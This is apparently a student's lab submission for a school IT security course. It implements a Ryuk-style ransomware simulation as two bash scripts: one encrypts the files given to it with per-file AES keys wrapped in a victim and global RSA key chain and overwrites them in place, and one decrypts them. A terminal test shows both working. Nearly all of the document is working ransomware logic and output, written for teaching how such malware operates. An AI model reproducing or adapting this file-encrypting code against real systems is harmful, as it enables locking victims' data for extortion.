Name

- Cedric Schmid

Klasse

- 5AHITS

Fach

- ITSE

Datum

- 11.10.2026

# Aufgabenstellung

https://www.franzmatejka.at/htl/doc/ITSI/lab/ransom_ryuk/01_ryuk.html

# Lösung

## `ryuk_ransom.sh`

```bash
#!/bin/bash

# generates global and victim rsa keypairs + aes victim key
generate_keys() {
  # global rsa keypair
  openssl genrsa -out rsa_global_key_private.key 2048
  openssl rsa -pubout -in rsa_global_key_private.key -out rsa_global_key_public.key 2>/dev/null

  # victim rsa keypair
  openssl genrsa -out rsa_victim_key_private.key 2048
  openssl rsa -pubout -in rsa_victim_key_private.key -out rsa_victim_key_public.key 2>/dev/null

  # aes victim key
  aes_victim_key=$(openssl rand -hex 32)

  # encrypts the private victim rsa key with the aes victim key
  openssl aes-256-cbc -in rsa_victim_key_private.key -out victim_private.enc -K "$aes_victim_key" -iv "$iv"
  rm rsa_victim_key_private.key

  # encrypts the aes victim key with the public global rsa key
  echo "$aes_victim_key" | openssl pkeyutl -encrypt -pubin -inkey rsa_global_key_public.key -out victim_key.enc

  # "delete" the private global rsa key but keep it for easier decryption
  mv rsa_global_key_private.key rsa_global_key_private.key.DELETED
}

encrypt_file() {
  file="$1"
  files_to_ignore=("ryuk_decrypt.sh" "ryuk_ransom.sh")

  # skip directories
  [[ -d "$file" ]] && return 0

  # skip encryption and decryption scripts
  for f in "${files_to_ignore[@]}"
  do
    [[ "$file" == "$f" ]] && return 0
  done

  echo "encrypting: $file"

  # generate aes file key
  aes_file_key=$(openssl rand -hex 32)

  # encrypts the file
  openssl aes-256-cbc -in "$file" -out "$file.enc" -K "$aes_file_key" -iv "$iv"

  # encrypts the aes file key with the public victim rsa key
  echo "$aes_file_key" | openssl pkeyutl -encrypt -pubin -inkey rsa_victim_key_public.key -out "$file.key"

  # concatenate encrypted file + encrypted key
  cat "$file.enc" "$file.key" > "$file"
  rm "$file.enc" "$file.key"
}

# exit immediately if no arguments given
[[ $# == 0 ]] && exit

iv="00000000000000000000000000000000"
generate_keys

for file in "$@"
do
  encrypt_file "$file"
done
```

## `ryuk_decrypt.sh`

```bash
#!/bin/bash

decrypt_file() {
  file="$1"
  files_to_ignore=("rsa_global_key_private.key.DELETED" "rsa_global_key_public.key" "rsa_victim_key_public.key" "ryuk_decrypt.sh" "ryuk_ransom.sh" "victim_key.enc" "victim_private.enc")

  # skip directories
  [[ -d "$file" ]] && return 0

  # skip ryuk scripts + keys
  for f in "${files_to_ignore[@]}"
  do
    [[ "$file" == "$f" ]] && return 0
  done

  echo "decrypting: $file"

  # restore private rsa victim key
  aes_victim_key=$(openssl pkeyutl -decrypt -inkey rsa_global_key_private.key.DELETED -in victim_key.enc)
  openssl aes-256-cbc -d -in victim_private.enc -out rsa_victim_key_private.key -K "$aes_victim_key" -iv "$iv"

  # extract aes file key
  tail -c 256 "$file" > "$file.key"
  aes_file_key=$(openssl pkeyutl -decrypt -inkey rsa_victim_key_private.key -in "$file.key")

  # remove encrypted aes file key from encrypted file
  truncate -s -256 "$file"

  # decrypt file
  openssl aes-256-cbc -d -in "$file" -out "$file.DECRYPTED" -K "$aes_file_key" -iv "$iv"
  mv "$file.DECRYPTED" "$file"
  rm "$file.key" rsa_victim_key_private.key
}

# exit immediately if no arguments given
[[ $# == 0 ]] && exit

iv="00000000000000000000000000000000"

for file in "$@"
do
  decrypt_file "$file"
done

rm rsa_global_key_private.key.DELETED rsa_global_key_public.key rsa_victim_key_public.key victim_key.enc victim_private.enc
```

## Test

```bash
$ echo test > test
$ echo hello > hello.txt
$ ./ryuk_ransom.sh *
encrypting: hello.txt
encrypting: test
$ xxd test
00000000: c680 7c01 4fcc 7569 1080 eb04 35a8 4172  ..|.O.ui....5.Ar
00000010: 2465 4065 8596 69a8 175f a526 d88c 26ad  $e@e..i.._.&..&.
00000020: d9db f983 257c c221 1c0c 5cbf 1a45 9337  ....%|.!..\..E.7
00000030: 3795 e337 c9f9 dad8 5432 0cad 43fd ab50  7..7....T2..C..P
00000040: bf74 4b39 37c0 56f2 6de8 d950 0aa6 b794  .tK97.V.m..P....
00000050: 72bc 64c0 d24b 92d6 ba85 e432 1bb2 c2f4  r.d..K.....2....
00000060: ed66 20db 76b2 8a03 fefc 0e0f e630 21ee  .f .v........0!.
00000070: b805 eefd 3c50 bcf1 8d71 a676 834e a60e  ....<P...q.v.N..
00000080: 4d25 986a 65e0 59f9 5ddd bb30 6b86 c0b7  M%.je.Y.]..0k...
00000090: e7dd 0c7e 985e 62db 12dc d403 baa6 83d8  ...~.^b.........
000000a0: 6894 6831 3c4e db21 825e bfaa fee7 27b0  h.h1<N.!.^....'.
000000b0: 5d0d befa 0171 ff30 be01 3b3b 7abe 9394  ]....q.0..;;z...
000000c0: f970 257d 01a8 487c 7450 e3b0 1de9 0bee  .p%}..H|tP......
000000d0: d4d7 d4c7 0326 6170 cbd5 b039 09a5 7d3b  .....&ap...9..};
000000e0: 9e45 b079 d4f8 f506 4862 bb5c 94ad 41aa  .E.y....Hb.\..A.
000000f0: 2f96 0cd5 1ffc 676d 024a dbc7 437d b47a  /.....gm.J..C}.z
00000100: 60db eda3 5441 098c 3462 525e 9b9a fa6b  `...TA..4bR^...k
$ xxd hello.txt 
00000000: 9f7c 6b30 2d9c 7cc0 8881 5da4 c546 c2c0  .|k0-.|...]..F..
00000010: ba53 d870 a424 5dcb fedc 0309 aeba 4060  .S.p.$].......@`
00000020: a5fe 43b3 5cb9 002a be4f ff16 4b43 5120  ..C.\..*.O..KCQ 
00000030: d65b 6bef fa65 142f abce 850a c03a f2e3  .[k..e./.....:..
00000040: 6387 5b9d c71c cce0 b523 8108 0f8c 3775  c.[......#....7u
00000050: 8485 c3b1 8dc5 adec 75ae 74a0 aa67 7dce  ........u.t..g}.
00000060: 2f46 254b e001 9cad 8528 bdb8 2028 2635  /F%K.....(.. (&5
00000070: 25e8 da8e 9d24 bd5d c8ab cf14 7abb 8ea1  %....$.]....z...
00000080: b3a0 8d4b c14e 67e2 264a 48c3 df1d d0e6  ...K.Ng.&JH.....
00000090: 6125 f35b d0e1 7cfe a49f e312 dac5 4be1  a%.[..|.......K.
000000a0: bb08 f279 b8f6 fa1f a912 bfdb 564d d684  ...y........VM..
000000b0: 09d5 c260 2b7d fe81 076d a000 a7a4 796e  ...`+}...m....yn
000000c0: e73a 1bf9 b1bd 55f0 7fd7 8411 beca 36ef  .:....U.......6.
000000d0: ecdc 5833 abbb ec9d 26b9 38ea 6879 31ec  ..X3....&.8.hy1.
000000e0: ace1 53e7 0faa 4038 ae59 25d5 d241 622b  ..S...@8.Y%..Ab+
000000f0: 9ab5 3c9f 539f 6e1c 52f9 0380 7aec 1e14  ..<.S.n.R...z...
00000100: 7ad1 e76a 57e8 d069 3a7b f7f2 906e 5b77  z..jW..i:{...n[w
$ ./ryuk_decrypt.sh *
decrypting: hello.txt
decrypting: test
$ cat test hello.txt 
test
hello
```
